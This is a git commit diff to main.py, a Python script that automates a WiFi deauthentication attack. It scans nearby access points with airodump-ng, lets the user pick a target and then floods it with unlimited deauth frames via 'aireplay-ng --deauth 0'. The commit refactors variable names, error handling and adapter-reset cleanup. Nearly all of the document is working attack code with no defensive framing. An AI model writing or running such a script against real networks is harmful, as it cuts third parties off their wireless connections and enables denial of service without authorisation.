e830378e6493f3c14cc35d3cab2729c825c12231
Gabriel Kuka <gabrie.kuka@gmail.com>
2022-05-22 13:05:09 +0200

    Fixed AP scanning bug

--- main.py
+++ main.py
@@ -4,6 +4,24 @@ import subprocess, os, re, csv, time
 def command(cmd):
     return cmd.split(' ')
 
+def delete_csv():
+    csv_files = list(filter(lambda x: '.csv' in x, os.listdir('.')))
+
+    for file in csv_files:
+        os.remove(file) 
+
+def reset_nic(nic):
+    if not nic:
+        print("No wifi adapter to reset.")
+        return
+
+    delete_csv()
+
+    print(f"\nAttack halted.\nResetting {nic} to managed mode...")
+    subprocess.run(command(f"airmon-ng stop {nic}"), stdout=DEVNULL)
+    print("Restarting NIC processes...")
+    subprocess.run(command("sudo systemctl start wpa_supplicant NetworkManager"))
+
 active_wireless_networks = []
 
 def check_for_essid(essid, lst):
@@ -38,6 +56,7 @@ print("The following WiFi adapters were found:")
 for k, v in enumerate(scanned_nics):
     print(f"{k} - {v}")
 
+# Choose the wifi adapter 
 while True:
     if len(scanned_nics) == 1:
         nic_index = 0 
@@ -49,15 +68,18 @@ while True:
     except:
         print("Please enter a number that corresponds with the choices available.")
 
-hacknic = scanned_nics[int(nic_index)]
+nic = scanned_nics[int(nic_index)]
 
-print(f"Killing intrusive system processes...")
+print(f"Killing intrusive system processes...", end=" ")
 subprocess.run(command("sudo airmon-ng check kill"), stdout=DEVNULL)
+print("Done.")
 
-print(f"Putting {hacknic} into monitored mode:")
-subprocess.run(command(f"sudo airmon-ng start {hacknic}"), stdout=DEVNULL)
+print(f"Putting {nic} into monitored mode...", end=" ")
+subprocess.run(command(f"sudo airmon-ng start {nic}"), stdout=DEVNULL)
+nic += "mon"
+print("Done.")
 
-subprocess.Popen(command(f"sudo airodump-ng -w file --write-interval 1 --output-format csv {hacknic}mon"), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+subprocess.Popen(command(f"sudo airodump-ng -w file --write-interval 1 --output-format csv {nic}"), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 try:
     while True:
@@ -66,57 +88,60 @@ try:
         fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', \
             'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
 
-        with open('file-01.csv') as file:
+        filenames = list(filter(lambda x: '.csv' in x, os.listdir('.')))
+
+        if not filenames:
+            continue
+    
+        with open(filenames[0]) as file:
             file.seek(0)
 
             csv_reader = csv.DictReader(file, fieldnames=fieldnames)
             for row in csv_reader:
-                # We want to exclude the row with BSSID.
                 if row["BSSID"] == "BSSID":
                     pass
-                # We are not interested in the client data.
                 elif row["BSSID"] == "Station MAC":
                     break
-                # Every field where an ESSID is specified will be added to the list.
+
                 elif not check_for_essid(row["ESSID"], active_wireless_networks):
                     active_wireless_networks.append(row)
 
-        #print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
+        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
         print("No |\tBSSID              |\tChannel|\tESSID                         |")
         print("___|\t___________________|\t_______|\t______________________________|")
         for index, item in enumerate(active_wireless_networks):
             print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
         time.sleep(1)
-
+except FileExistsError:
+    print("[-] Error: CSV file not found.")
+    reset_nic(nic)
 except KeyboardInterrupt:
-    print("\nReady to make choice.")
-    if os.path.exists("file-01.csv"):
-        os.remove("file-01.csv")
+    delete_csv()
+except Exception as e:
+    print(f"[-] Error: {e}")
+    reset_nic(nic)
 
-# Ensure that the input choice is valid.
+#Choose Access Point
 while True:
-    # If you don't make a choice from the options available in the list, 
-    # you will be asked to please try again.
-    choice = input("Please select a choice from above: ")
+    choice = input("Please select one of the access points above: ")
     try:
         if active_wireless_networks[int(choice)]:
+            AP = active_wireless_networks[int(choice)]
             break
+    except KeyboardInterrupt:
+        reset_nic(nic)
     except:
-        print("Please try again.")
+        print("[-] Error: Invalid choice. Please try again.")
 
-# To make it easier to work with and read the code, we assign the results to variables.
-hackbssid = active_wireless_networks[int(choice)]["BSSID"]
-hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
+ap_mac = AP["BSSID"]
+ap_channel = AP["channel"].strip()
 
 # Change to the channel we want to perform the DOS attack on. 
-subprocess.run(command(f"airmon-ng start {hacknic}mon {hackchannel}"), stdout=DEVNULL)
+subprocess.run(command(f"airmon-ng start {nic} {ap_channel}"), stdout=DEVNULL)
 
 try:
-    subprocess.run(command(f"aireplay-ng --deauth 0 -a {hackbssid} {scanned_nics[int(nic_index)]}mon"))
+    subprocess.run(command(f"aireplay-ng --deauth 0 -a {ap_mac} {nic}"))
 except KeyboardInterrupt:
-    print(f"\nAttack halted.\nResetting {hacknic} to managed mode...")
-    subprocess.run(command(f"airmon-ng stop {hacknic}mon"), stdout=DEVNULL)
-    print("Restarting NIC processes...")
-    subprocess.run(command("sudo systemctl start wpa_supplicant NetworkManager"))
+    reset_nic(nic)
 finally:
     print("Bye!")
